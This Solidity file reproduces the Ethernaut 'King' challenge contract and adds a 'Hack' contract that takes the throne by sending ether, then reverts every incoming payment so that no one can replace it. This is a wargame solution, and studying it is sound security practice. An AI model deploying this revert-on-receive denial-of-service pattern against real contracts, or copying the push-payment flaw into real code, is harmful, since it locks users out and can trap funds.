// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

contract King {

  address payable king;
  uint public prize;
  address payable public owner;

  constructor() payable {
    owner = payable(msg.sender);  
    king = payable(msg.sender);
    prize = msg.value;
  }

  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    king.transfer(msg.value);
    king = payable(msg.sender);
    prize = msg.value;
  }

  function _king() public view returns (address payable) {
    return king;
  }
}


interface KingI {

  function owner() external view returns(address payable);
  function prize() external view returns(uint);
}

contract Hack {

   KingI king;
   
   constructor(address _contractAddress){
     king = KingI(_contractAddress);
   }
   
   function checkContractBalance() public view returns(uint){
     return address(king).balance;
   }

   function getOwner() public view returns(address payable){
     return king.owner();
   }

   function getPrize() public view returns(uint) {
     return king.prize();
   }

  function hack() public payable {
      require(msg.value >= 1000000000000000, "value should be > prize");
      (bool success,) = payable(address(king)).call{value: msg.value}("");
      require(success, "Eth was not sent");
    }

    // This function fails "king.transfer" trx from Ethernaut
    receive() external payable {
        revert("haha you fail");
    }

}

